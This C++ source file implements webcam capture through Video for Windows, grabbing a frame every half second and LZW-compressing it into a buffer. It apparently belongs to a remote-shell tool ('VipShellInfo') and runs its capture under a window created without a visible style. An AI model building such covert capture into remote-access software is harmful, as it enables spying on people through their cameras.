#include ".\getcapdata.h"
#include "..\VipShellInfo\Lzw.h"

#include <tchar.h>
#pragma comment (lib, "Vfw32.lib")
struct tag_CapData
{
	BYTE* pCapBuff;
	DWORD dwLen;
};

tag_CapData g_CapData;
HWND g_hwndVideo = NULL;
CMyCriticalSection g_BuffLock;
bool g_IsLock  = false;
struct strCreateWndTag
{
	TCHAR szText[256];
	RECT rc;
};
CGetCapData::CGetCapData(void)
{
	g_CapData.pCapBuff = NULL;
	g_CapData.dwLen = 0;
	m_hwndVideo = NULL;
	b_IsOpen = false;
	m_hwndMain = NULL;
	g_IsLock = false;
	m_pDataLzw = NULL;
	m_dwLzwBuflen = 0;
	m_pHash = new WORD [LZW_MAX_HASH_SIZE] ;
}

CGetCapData::~CGetCapData(void)
{
	if(g_CapData.pCapBuff)
		delete g_CapData.pCapBuff;
	g_CapData.pCapBuff = NULL;
	g_CapData.dwLen = 0;
	Stop();
	if(m_pDataLzw)
		delete m_pDataLzw;
	delete m_pHash;
}

bool CGetCapData::IsOpen()
{
	return b_IsOpen;
}
void CGetCapData::__NewLzwBuff(DWORD dwLen)
{
	if(m_dwLzwBuflen < dwLen)
	{	
		if(m_pDataLzw)
			delete m_pDataLzw;
		m_pDataLzw = new BYTE[dwLen];
		if (m_pDataLzw)
			m_dwLzwBuflen = dwLen;
		else
			m_dwLzwBuflen = 0;
	}
}
bool CGetCapData::GetCapDataBuff(BYTE** pBuff, DWORD* dwLen, BYTE** pBufflzw , DWORD* dwlzw)
{

	if(pBuff)
		*pBuff = g_CapData.pCapBuff;
	if(dwLen)
		*dwLen = g_CapData.dwLen;
	if( g_CapData.dwLen == 0)
		return false;
	if(pBufflzw)
	{
		__NewLzwBuff(g_CapData.dwLen);
		//Ñ¹Ëõ
		FCLzw lzw;
		memset(m_pDataLzw, 0, g_CapData.dwLen);
		DWORD dwRLzwLen =  lzw.LZW_Encode(g_CapData.pCapBuff, g_CapData.dwLen, m_pDataLzw, m_pHash);
		*pBufflzw = m_pDataLzw;
		if(dwlzw)
			*dwlzw = dwRLzwLen;
	}
	return true;
}

bool CGetCapData::Stop()
{

	capPreview(g_hwndVideo, FALSE);
	capDriverDisconnect(g_hwndVideo);
	capCaptureStop(g_hwndVideo);
	capCaptureSingleFrameClose(g_hwndVideo);
	SendMessage(g_hwndVideo, WM_CLOSE, NULL, NULL);

	SendMessage(m_hwndMain, WM_CLOSE, NULL, NULL);
	SendMessage(m_hwndMain, WM_DESTROY, NULL, NULL);
	b_IsOpen = false;
	g_hwndVideo = NULL;
	m_hwndMain = NULL;
	return true;
}

void CGetCapData::Start(LPCTSTR szText, RECT* rc)
{
	if(b_IsOpen)
		return ;
	strCreateWndTag* pInfo = new strCreateWndTag;
	lstrcpy(pInfo->szText, szText);
	memcpy(&pInfo->rc, rc, sizeof(RECT));
	NewThread(pInfo);
}
BYTE* CGetCapData::__NewBuff(DWORD dwLen)
{
	if(dwLen > g_CapData.dwLen)
	{
		if(g_CapData.pCapBuff)
		{
			delete g_CapData.pCapBuff;
			g_CapData.pCapBuff = NULL;
		}
		g_CapData.pCapBuff = new BYTE[dwLen];
		if( g_CapData.pCapBuff )
			g_CapData.dwLen = dwLen;
		else
			g_CapData.dwLen = 0;
	}
	return g_CapData.pCapBuff;
}

void CGetCapData::OnNewThread(DWORD dwCreateMarker, DWORD dwThreadId, LPVOID lpParameter)
{

	strCreateWndTag* pInfo = (strCreateWndTag*)lpParameter;

	WCHAR szClassName[] = L"___GetCapWnd___";
	WNDCLASS wc={0};
	wc.style         = CS_HREDRAW | CS_VREDRAW ;
	wc.lpfnWndProc = CGetCapData::WindowProc;
	wc.cbClsExtra    = 0 ;
	wc.cbWndExtra    = 0 ;
	wc.hInstance = GetModuleHandle(NULL);
	wc.hIcon         = LoadIcon (NULL, IDI_APPLICATION) ;
	wc.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
	wc.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
	wc.lpszMenuName  = NULL ;
	wc.lpszClassName = szClassName;

	RegisterClass(&wc);
	m_hwndMain = CreateWindowEx(0, szClassName, pInfo->szText, NULL, pInfo->rc.left, pInfo->rc.top, pInfo->rc.right, pInfo->rc.bottom, NULL, NULL, NULL, NULL);

	delete pInfo;
	if(IsWindow(m_hwndVideo))
		return ;
	CAPDRIVERCAPS CapDrvCaps;
	TCHAR szVfwName[256];
	TCHAR szVfwVersion[256];
	ZeroMemory(szVfwName, sizeof(szVfwName));
	ZeroMemory(szVfwVersion, sizeof(szVfwVersion));
	capGetDriverDescription(0, szVfwName, sizeof(szVfwName), szVfwVersion, sizeof(szVfwVersion));
	if(lstrlen(szVfwName) == 0)
		return ;
	m_hwndVideo = capCreateCaptureWindow(
		_T("My Capture Window"),
		WS_CHILD | WS_VISIBLE | WS_OVERLAPPEDWINDOW,
		0, 0, 300, 280,
		(HWND) m_hwndMain,
		(int) 1);
	if(m_hwndVideo == NULL)
		return ;

	BOOL bIsOk = capDriverConnect(m_hwndVideo,0);
	if(!bIsOk)
		return ;

	bIsOk =  capDriverGetCaps(m_hwndVideo, &CapDrvCaps,  sizeof(CAPDRIVERCAPS));
	if(!bIsOk)
		return ;
	if (CapDrvCaps.fHasOverlay) 
		capOverlay(m_hwndVideo, TRUE);
	capSetCallbackOnFrame(m_hwndVideo, CGetCapData::FrameCallBack);
	b_IsOpen =true;
	g_hwndVideo = m_hwndVideo;

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) 
	{

		TranslateMessage(&msg);
		DispatchMessage(&msg);

	}


}

LRESULT PASCAL CGetCapData::WindowProc(HWND hwnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_CREATE:
		SetTimer(hwnd, 0x100, 500, NULL);
		break;
	case WM_TIMER:
		capCaptureSingleFrame(g_hwndVideo);
		capCaptureSingleFrameOpen(g_hwndVideo);
		break;
	case WM_PAINT:
		break;
	case WM_DESTROY:
		KillTimer(hwnd, 0x100);
		capPreview(g_hwndVideo, FALSE);
		capDriverDisconnect(g_hwndVideo);
		capCaptureStop(g_hwndVideo);
		capCaptureSingleFrameClose(g_hwndVideo);
		SendMessage(g_hwndVideo, WM_CLOSE, NULL, NULL);
		return 0 ;
	}
	return DefWindowProc (hwnd, uMsg, wParam, lParam) ;
}
